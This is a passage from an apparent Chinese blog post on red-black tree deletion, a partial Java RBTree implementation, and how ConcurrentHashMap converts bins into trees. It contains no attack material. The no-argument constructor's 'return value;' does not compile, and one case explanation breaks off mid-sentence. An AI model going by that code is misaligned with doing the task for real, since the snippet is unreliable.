RBTree的删除操作</h4><p>删除操作首先需要做的也是BST的删除操作，删除操作会删除对应的节点，如果是叶子节点就直接删除，如果是非叶子节点，会用对应的中序遍历的后继节点来顶替要删除节点的位置。删除后就需要做删除修复操作，使得树符合红黑树的定义，符合定义的红黑树高度是平衡的。</p><p>删除修复操作在遇到被删除的节点是红色节点或者到达root节点后，修复操作完毕。</p><p>删除修复操作是针对删除黑色节点才有的，当黑色节点被删除后会让整个树不符合RBTree的定义的第四条。需要做的处理是从兄弟节点上借调黑色的节点过来，如果兄弟节点没有黑节点可以借调的话，就只能往上追溯，将每一级的黑节点数减去一个，使得整棵树符合红黑树的定义。</p><p>删除操作的总体思想是从兄弟节点借调黑色节点使树保持局部平衡，如果局部的平衡达到了，就看整体的树是否是平衡的，如果不平衡就接着向上追溯调整。</p><p>删除修复操作分为四种情况（删除黑节点后）：</p><ul><li>待删除节点的兄弟节点是红色的节点</li><li>待删除的节点的兄弟节点是黑色的节点，且兄弟节点的子节点都是黑色的</li><li>待调整的节点的兄弟节点是黑色的节点，且兄弟节点的左子节点是红色的，右节点是黑色的（兄弟节点在右边），如果兄弟节点在左边的话，就是兄弟节点的右子节点是红色的，左节点是黑色的</li><li>待调整节点的兄弟节点是黑色的节点，且右子节点是红色的（兄弟节点在右边），如果兄弟节点在左边，则就是对应的就是左节点是红色的</li></ul><h5 id="删除操作case1"><a class="markdownIt-Anchor" href="#删除操作case1"></a> 删除操作——case1</h5><p>由于兄弟节点是红色节点的时候，无法借调黑色节点，所以需要将兄弟节点提升到父节点，由于兄弟节点是红色的，根据RBTree的定义，兄弟节点的子节点是黑色的，就可以从它的子节点借调了。</p><p>case1这样转换之后就会变成后面的case2、case3，或者case4进行处理。上升操作需要对C做一个左旋操作，如果是镜像结构的树只需要做对应的右旋操作即可。</p><p>之所以要做case1操作是因为兄弟节点是红色的，无法借到一个黑节点来填补删除的黑节点。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/v2-46e732e84148b9bca53e995689e9ba9f_hd.png" alt="" /></p><h5 id="删除操作case2"><a class="markdownIt-Anchor" href="#删除操作case2"></a> 删除操作——case2</h5><p>case2的删除操作是由于兄弟节点可以消除一个黑色节点，因为兄弟节点和兄弟节点的子节点都是黑色的，所以可以将兄弟节点变红，这样就可以保证树的局部的颜色符合定义了。这个时候需要将父节点A变成新的节点，继续向上调整，直到整棵树的颜色符合RBTree的定义为止。</p><p>case2这种情况下之所以要将兄弟节点变红，是因为如果把兄弟节点借调过来，会导致兄弟的结构不符合RBTree的定义，这样的情况下只能是将兄弟节点也变成红色来达到颜色的平衡。当将兄弟节点也变红之后，达到局部的平衡了，但是对于祖父节点来说不符合定义4的。这样就需要回溯到父节点，接着进行修复操作。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/v2-7975d1b235cd30c0bafb716b585ba45d_hd.png" alt="" /></p><h5 id="删除操作case3"><a class="markdownIt-Anchor" href="#删除操作case3"></a> 删除操作——case3</h5><p>case3的删除操作是一个中间状态，它的目的是将左边的红色节点借调过来，这样就可以转换成case4状态，在case4状态下可以将D、E节点借调过来，通过将两个节点变成黑色来保证红黑树的平衡。</p><p>之所以说case3是一个中间状态，是因为根据红黑树的定义来说，下图并不是平衡的，它是通过case 2操作完后向上回溯出现的状态。之所以会出现C。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/v2-04dbb22d25de3849d902582809198596_hd.png" alt="" /></p><h5 id="删除操作case4"><a class="markdownIt-Anchor" href="#删除操作case4"></a> 删除操作——case4</h5><p>case4操作是真正的节点借调操作，通过将兄弟节点以及兄弟节点的右节点借调过来，并将兄弟节点的右子节点变成红色来达到借调两个黑色节点的目的，这样的话，整棵树还是符合RBTree的定义。</p><p>case4这种情况的发生只有在待删除的节点的兄弟节点为黑，且子节点不全部为黑，才有可能借调到两个节点来做黑节点使用，从而保持整棵树都符合红黑树的定义</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/v2-a559407bb4847a140642d16c6301d7db_hd.png" alt="" /></p><h5 id="删除操作的总结"><a class="markdownIt-Anchor" href="#删除操作的总结"></a> 删除操作的总结</h5><p>红黑树的删除操作是最复杂的操作，复制的地方在于当删除了黑色节点的时候，如何从兄弟节点去借调节点，以保证树的颜色符合定义。由于红色的兄弟节点是没法借调出黑节点的，这样只能通过选择操作让他上升到父节点，而由于它是红节点，所以它的子节点就是黑的，可以借调。</p><p>对于兄弟节点是黑色节点的可以分为三种情况来处理，当所有的兄弟节点的子节点都是黑色节点时，可以直接将兄弟节点变红，这样局部的红黑树颜色是符合定义的。但是整棵树不一定是符合红黑树定义的，需要往上追溯继续调整。</p><p>对于兄弟节点的子节点为左红右黑（全部为红，右红左黑）两种情况，可以先将前面的情况通过选择转换为后一种情况，在后一种情况下，因为兄弟节点为黑，兄弟节点的右节点为红，可以借调出两个节点出来做黑节点，这样就可以保证删除了黑节点，整棵树还是符合红黑树定义的，因为黑色节点的个数没有改变。</p><p>红黑树的删除操作是遇到删除的节点为红色，或者追溯调整到了root节点，这时删除的修复操作完毕。</p><h2 id="三-rbtree的java实现"><a class="markdownIt-Anchor" href="#三-rbtree的java实现"></a> 三、RBTree的Java实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RBTreeNode</span>&lt;<span class="title">T</span> <span class="keyword">extends</span> <span class="title">Comparable</span>&lt;<span class="title">T</span>&gt;&gt; </span>&#123;</span><br><span class="line">  <span class="comment">// node value</span></span><br><span class="line">  <span class="keyword">private</span> T value;</span><br><span class="line">  <span class="comment">// left child pointer </span></span><br><span class="line">  <span class="keyword">private</span> RBTreeNode&lt;T&gt; left;</span><br><span class="line">  <span class="comment">// right child pointer</span></span><br><span class="line">  <span class="keyword">private</span> RBTreeNode&lt;T&gt; right;</span><br><span class="line">  <span class="comment">// parent pointer</span></span><br><span class="line">  <span class="keyword">private</span> RBTreeNode&lt;T&gt; parent;</span><br><span class="line">  <span class="comment">// color is red or not red</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">boolean</span> red;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">RBTreeNode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">RBTreeNode</span><span class="params">(T value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.value = value;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">RBTreeNode</span><span class="params">(T value, <span class="keyword">boolean</span> isRed)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.value = value;</span><br><span class="line">    <span class="keyword">this</span>.red = isRed;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> T <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(T value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.value = value;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> RBTreeNode&lt;T&gt; <span class="title">getLeft</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLeft</span><span class="params">(RBTreeNode&lt;T&gt; left)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.left = left;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> RBTreeNode&lt;T&gt; <span class="title">getRight</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> right;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRight</span><span class="params">(RBTreeNode&lt;T&gt; right)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.right = right;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isRed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> red;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isBlack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !red;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isLeaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> left == <span class="keyword">null</span> &amp;&amp; right == <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRed</span><span class="params">(<span class="keyword">boolean</span> red)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.red = red;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeRed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    red = <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeBlack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    red = <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RBTree</span>&lt;<span class="title">T</span> <span class="keyword">extends</span> <span class="title">Comparable</span>&lt;<span class="title">T</span>&gt;&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> RBTreeNode&lt;T&gt; root;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// node number</span></span><br><span class="line">  <span class="keyword">private</span> java.util.concurrent.atomic.AtomicLong size = </span><br><span class="line">    <span class="keyword">new</span> java.util.concurrent.atomic.AtomicLong(<span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// in overwrite mode, all node's value cannot has same value</span></span><br><span class="line">  <span class="comment">// in non-overwrite mode, node can have same value, suggest don't use non-overwrite mode</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> overrideMode = <span class="keyword">true</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">RBTree</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.root = <span class="keyword">new</span> RBTreeNode&lt;T&gt;();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="concurrenthashmap二叉树的构造过程"><a class="markdownIt-Anchor" href="#concurrenthashmap二叉树的构造过程"></a> ConcurrentHashMap二叉树的构造过程</h2><p>对于ConcurrentHashMap，链表的长度超过8时，会调用<code>treeifyBin()</code>方法将链表结构转换为红黑树。</p><p>下面是ConcurrentHashMap中节点类型和继承关系</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_17-28-46.png" alt="" /></p><p>**注意点：**Node是链表中的元素，而TreeBin和TreeNode也继承自Node节点，也自然继承了next属性，同样拥有了链表的性质，其实真正在存储时，红黑树仍然是以链表形式存储的，只是逻辑上TreeBin和TreeNode多了支持红黑树的root、first、parent、left、right和red属性，在附加的属性上进行了逻辑上的引用和关联，也就造就了一棵树</p><p>所以理解了上面的红黑树其实也是一个链表，再来看源码就不难理解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Replaces all linked nodes in bin at given index unless table is</span></span><br><span class="line"><span class="comment"> * too small, in which case resizes instead.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> tab table表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> index 转换为红黑树的链表在table中的索引下标</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">treeifyBin</span><span class="params">(Node&lt;K,V&gt;[] tab, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">  Node&lt;K,V&gt; b; <span class="keyword">int</span> n, sc;</span><br><span class="line">  <span class="keyword">if</span> (tab != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 一开始并非直接转换为红黑树，而是通过扩容table到2倍的方式</span></span><br><span class="line">    <span class="comment">// 只有table的长度大于64之后，才会将超过8个元素的链表转换为红黑树</span></span><br><span class="line">    <span class="keyword">if</span> ((n = tab.length) &lt; MIN_TREEIFY_CAPACITY)</span><br><span class="line">      tryPresize(n &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// b.hash &gt;= 0 即为普通的Node链表节点</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((b = tabAt(tab, index)) != <span class="keyword">null</span> &amp;&amp; b.hash &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// 锁住链表头</span></span><br><span class="line">      <span class="keyword">synchronized</span> (b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tabAt(tab, index) == b) &#123;</span><br><span class="line">          TreeNode&lt;K,V&gt; hd = <span class="keyword">null</span>, tl = <span class="keyword">null</span>;</span><br><span class="line">          <span class="comment">// 将原Node链表转换成以TreeBin节点为元素的链表</span></span><br><span class="line">          <span class="keyword">for</span> (Node&lt;K,V&gt; e = b; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">            TreeNode&lt;K,V&gt; p =</span><br><span class="line">              <span class="keyword">new</span> TreeNode&lt;K,V&gt;(e.hash, e.key, e.val,</span><br><span class="line">                                <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span> ((p.prev = tl) == <span class="keyword">null</span>)</span><br><span class="line">              hd = p;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              tl.next = p;</span><br><span class="line">            tl = p;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// TreeBin的构造方法构造树，根据TreeBin链表构造</span></span><br><span class="line">          setTabAt(tab, index, <span class="keyword">new</span> TreeBin&lt;K,V&gt;(hd));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从源码可以看出，一开始并非直接转换为红黑树，而是通过扩容table到2倍的方式，只有table的长度大于64之后，才会将超过8个元素的链表转红黑树。红黑树的构造过程是在TreeBin的构造方法中完成的。</p><h3 id="红黑树的构造过程"><a class="markdownIt-Anchor" href="#红黑树的构造过程"></a> 红黑树的构造过程</h3><p>假设待构造的红黑树TreeNode链表如下，节点中的数值代表元素的hash值：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_17-59-57.png" alt="" /></p><p>源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates bin with initial set of nodes headed by b.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">TreeBin(TreeNode&lt;K,V&gt; b) &#123;</span><br><span class="line">  <span class="keyword">super</span>(TREEBIN, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">  <span class="keyword">this</span>.first = b;</span><br><span class="line">  TreeNode&lt;K,V&gt; r = <span class="keyword">null</span>;</span><br><span class="line">  <span class="comment">// 遍历TreeNode链表进行构造</span></span><br><span class="line">  <span class="keyword">for</span> (TreeNode&lt;K,V&gt; x = b, next; x != <span class="keyword">null</span>; x = next) &#123;</span><br><span class="line">    next = (TreeNode&lt;K,V&gt;)x.next;</span><br><span class="line">    x.left = x.right = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (r == <span class="keyword">null</span>) &#123;</span><br><span class="line">      x.parent = <span class="keyword">null</span>;</span><br><span class="line">      x.red = <span class="keyword">false</span>;</span><br><span class="line">      r = x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      K k = x.key;</span><br><span class="line">      <span class="keyword">int</span> h = x.hash;</span><br><span class="line">      Class&lt;?&gt; kc = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">for</span> (TreeNode&lt;K,V&gt; p = r;;) &#123;</span><br><span class="line">        <span class="comment">// 执行插入，dir为比对节点hash的大小的标识，决定插入时是左还是右</span></span><br><span class="line">        <span class="keyword">int</span> dir, ph;</span><br><span class="line">        K pk = p.key;</span><br><span class="line">        <span class="keyword">if</span> ((ph = p.hash) &gt; h)</span><br><span class="line">          dir = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ph &lt; h)</span><br><span class="line">          dir = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((kc == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">                  (kc = comparableClassFor(k)) == <span class="keyword">null</span>) ||</span><br><span class="line">                 (dir = compareComparables(kc, k, pk)) == <span class="number">0</span>)</span><br><span class="line">          dir = tieBreakOrder(k, pk);</span><br><span class="line">        TreeNode&lt;K,V&gt; xp = p;</span><br><span class="line">        <span class="keyword">if</span> ((p = (dir &lt;= <span class="number">0</span>) ? p.left : p.right) == <span class="keyword">null</span>) &#123;</span><br><span class="line">          x.parent = xp;</span><br><span class="line">          <span class="keyword">if</span> (dir &lt;= <span class="number">0</span>)</span><br><span class="line">            xp.left = x;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            xp.right = x;</span><br><span class="line">          <span class="comment">// 插入后，执行恢复操作，重新涂色或者旋转</span></span><br><span class="line">          r = balanceInsertion(r, x);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.root = r;</span><br><span class="line">  <span class="function"><span class="keyword">assert</span> <span class="title">checkInvariants</span><span class="params">(root)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码中，balanceInsertion方法为恢复操作。所以根据上述源码和红黑树的恢复策略，依次遍历链表节点插入到红黑树中，我们构造如下：</p><ul><li>节点80</li></ul><p>第一个节点80，插入到空树中，设置为根节点，并为黑色：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_18-34-51.png" alt="" /></p><ul><li>节点60</li></ul><p>节点60按二叉树插入后，未违反任何红黑树的性质，不做任何动作</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_18-35-52.png" alt="" /></p><ul><li>节点50</li></ul><p>节点50插入后，违反了性质4，按照<strong>情况5：当前节点的父节点是红色，叔叔节点是黑色，当前节点是左子节点</strong>进行恢复。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_18-36-56.png" alt="" /></p><p>按照情况5的恢复策略调整如下：<br />把当前节点的父节点变为黑色，祖父节点变为红色，将祖父节点更新为当前节点，以新的当前节点为支点进行右旋操作。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_18-41-03.png" alt="" /></p><ul><li>节点70</li></ul><p>节点70插入后，违反红黑树性质5，按照<strong>情况3：当前节点的父节点是红色，且叔叔节点也是红色</strong>进行调整。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_18-41-53.png" alt="" /></p><p>调整如下，需要经过两次涂色调整，将当前节点70的父节点和叔叔节点改为黑色，祖父节点改为红色。由于祖父节点为根节点，根节点只能为黑色，因此在此将根节点改为黑色，调整完成。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-13_14-59-47.png" alt="" /></p><ul><li>节点20</li></ul><p>节点20插入后未违反任何特性，无需调整。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_18-43-15.png" alt="" /></p><ul><li>节点65</li></ul><p>节点65插入后违反性质4，按照<strong>情况5：当前节点的父节点是红色，叔叔节点是黑色，当前节点是左子节点</strong>进行恢复。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_18-43-58.png" alt="" /></p><p>恢复调整如下，需要经过两个步骤，当前节点65的父节点改为黑色，祖父节点改为红色，然后将祖父节点设为最新的当前节点。涂色后的新树违反了性质5，因此还要以最新的当前节点为支点进行右旋操作：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_18-47-34.png" alt="" /></p><ul><li>节点40</li></ul><p>节点40插入后，违反红黑树性质4:父子节点不能都为红色，插入后的红黑树见下图：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_18-48-19.png" alt="" /></p><p>根据前文的调整策略，此处当前节点为红色，叔叔节点NIL为黑色，且当前节点为右子节点，**按情况4进行调整恢复：<br />步骤一：以当前节点40的父节点20为新的当前节点（见下图1）；<br />步骤二：以图1中新的当前节点20为支点，左旋（见下图2）；</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_18-57-23.png" alt="" /></p><p>旋转完成后，发现当前节点20和父节点40都为红色，仍然违反了红黑树的性质4，需要继续回溯当前节点再次旋转或涂色。此时，当前节点是左子节点，**按情况5进行调整恢复：<br />步骤一：将当前节点的父节点40重涂为黑色，祖父节点50重涂为红色（见下图3）；得到的红黑树发现不满足红黑树的性质5：从一个节点到其所有叶子节点的所有路径上包含相同数目的黑节点，继续执行步骤二的调整。<br />步骤二：以当前节点20的祖父节点50为新的当前节点，进行右旋（见下图5）；</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_18-58-01.png" alt="" /></p><p>到此，成功将节点40插入红黑树，满足所有红黑树的性质.</p><ul><li>节点10</li></ul><p>节点10插入后违反性质4，按照<strong>情况3：当前节点的父节点是红色，且叔叔节点（祖父节点的另一个子节点）也是红色</strong>进行恢复。</p><p><img src="/Users/haotongan/MyDocument/summary/personal/%E5%9B%BE%E7%89%87/Snipaste_2019-12-11_18-58-56.png" alt="" /></p><p>恢复调整如下，当前节点10的父节点和叔叔节点改为黑色，祖父节点40重涂为红色，调整就完成了：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/Snipaste_2019-12-11_18-59-33.png" alt="" /></p><p>至此，红黑树的构造完成。</p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> RBTree </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务雪崩、降级与熔断</title>
      <link href="/service-avalanche/"/>
      <url>/service-avalanche/</url>
      
